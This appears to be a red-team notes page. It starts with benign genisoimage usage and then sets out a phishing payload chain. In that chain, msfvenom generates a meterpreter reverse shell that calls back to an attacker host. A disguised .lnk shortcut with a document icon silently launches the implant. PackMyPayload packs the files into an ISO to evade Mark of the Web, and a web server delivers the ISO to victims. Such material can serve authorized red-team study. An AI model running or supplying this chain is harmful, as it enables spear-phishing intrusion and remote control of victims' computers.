# ISO File

## 01 - Manual

### 1.1 - Dependencies

Debian-based distros.

```
$ sudo apt install -y genisoimage
```

Arch-based distros.

```
$ sudo pacman -S genisoimage
```

### 1.2 - Usage

```
$ genisoimage -o file.iso file.txt

$ genisoimage -rJo file.iso /path/to/directory
```

## 02 - Automated

### 2.1 - Install

Install the Visual C++ Build Tools.

- https://visualstudio.microsoft.com/visual-cpp-build-tools

Turn off aliases for Python

Search **Manage app execution aliases.**

![[01 - Windows Search Bar.png]]

Turn off the **App Installers**

![[02 - Manage app execution aliases.png]]

Then install the Python packages.

```
C:\> git clone https://github.com/mgeeky/PackMyPayload.git
C:\> cd PackMyPayload
C:\PackMyPayload> python -m pip install -r requirements.txt
```

### 2.2 - Help Menu

```
C:\PackMyPayload> python .\PackMyPayload.py -h
usage:
+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

Usage: ./package.py [options] <infile> <outfile>

optional arguments:
  -h, --help            show this help message and exit

Required arguments:
  infile                Input file/directory to be packaged into output archive/container
  outfile               Output file with extension pointing at output format

Options:
  -v, --verbose         Verbose mode.
  -d, --debug           Debug mode.
  -N, --nocolor         Dont use colors in text output.
  -i BACKDOOR, --backdoor BACKDOOR
                        Instead of generating blank new output container/archive, will backdoor existing input one.
  -n NAME, --filename NAME
                        Package input file into archive/container under this filename (may contain relative path).
  -p PASSWORD, --password PASSWORD
                        If output archive/container format supports password protection, use this password to protect
                        output file.
  --out-format {zip,7z,iso,img,cab,pdf,vhd,vhdx}
                        Explicitely define output format disregarding output file's extension. Can be one of
                        following: zip, 7z, iso, img, cab, pdf, vhd, vhdx
  --hide HIDE           Set hidden attribute on file(s) in ISO

VHD specific options:
  --vhd-size SIZE       VHD dynamic size in MB. Default: 1024
  --vhd-letter LETTER   Drive letter where to mount VHD drive. Default: will pick unused one at random.
  --vhd-filesystem FS   Filesystem to be used while formatting VHD. Default: FAT32. Supported: fat, fat32, ntfs

=====================================================

Supported container/archive formats:

        - zip
        - 7z
        - iso
        - img
        - cab
        - pdf
        - vhd
        - vhdx

=====================================================
```

### 2.3 - Usage

#### 2.3.1 - Archive files

```
C:\PackMyPayload> python PackMyPayload.py [-p <password>] --out-format <zip | 7z | cab | pdf> [<drive_letter>:]\path\to\directory\ archive.<zip | 7z | cab | pdf>
```

#### 2.3.2 - Pack files inside container file

```
C:\PackMyPayload> python PackMyPayload.py [-p <password>] [--vhd-filesystem <fat | fat32 | ntfs>] --out-format <iso | img | vhd | vhdx> file.txt file.<iso | img | vhd | vhdx>
```

### 2.4 - Use Cases

#### 2.4.1 - Powershell Loader via Shortcut Lnk

```
$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | basenc -d --base64 > implant.ps1
```

Transfer the generated powershell reverse shell to the windows box to create `.lnk` shortcut and pack them into an ISO file

```powershell
PS C:\> $shortcutPath = "[<drive_letter>:]\path\to\directory\file.lnk"  
$WshShell = New-Object -ComObject WScript.Shell  
$Shortcut = $WshShell.CreateShortcut($shortcutPath)  
$Shortcut.TargetPath = 'conhost.exe'  
$Shortcut.Arguments = "--headless powershell.exe -noni -nop -ep bypass -file implant.ps1"  
$Shortcut.Description = "A shortcut backdoor"  
$Shortcut.IconLocation = 'C:\path\to\document.docx'  
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload  
$Shortcut.WindowStyle = 7  
$Shortcut.WorkingDirectory = "C:\Users\" + Eenv:USERNAME + "\Public"  
$Shortcut.Save()
```

Pack the files in a container.

```
C:\PackMyPayload> python PackMyPayload.py [--vhd-filesystem <fat | fat32 | ntfs>] --hide [<drive_letter>:]\path\to\directory\implant.ps1 --out-format iso C:\path\to\directory\ ISO_File.iso
```

Then copy the ISO File to your attacker machine and start a web server to simulate the spear phishing attack then finally you'll see **MOTW (Mark of the Web)** has not contaminated the `.lnk` shortcut file.

```
$ sudo python -m http.server 80
```

---
## References

- [Bumblebee Returns with New Infection Technique](https://blog.cyble.com/2022/09/07/bumblebee-returns-with-new-infection-technique/)

- [Recreating An ISO Payload for Fun and No Profit](https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/)

- [DLL Proxy Loading Your Favorite C Implant](https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/)

- [PackMyPayload](https://github.com/mgeeky/PackMyPayload)

- [Visual C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/)

- [Tommelo LNK2Pwn](https://github.com/tommelo/lnk2pwn)

- [IT-Gorillaz LNK2Pwn](https://github.com/it-gorillaz/lnk2pwn)

### Mitigation

- [Malicious.link: Blocking ISO mounting](https://room362.com/posts/2022/blocking-iso-mounting/)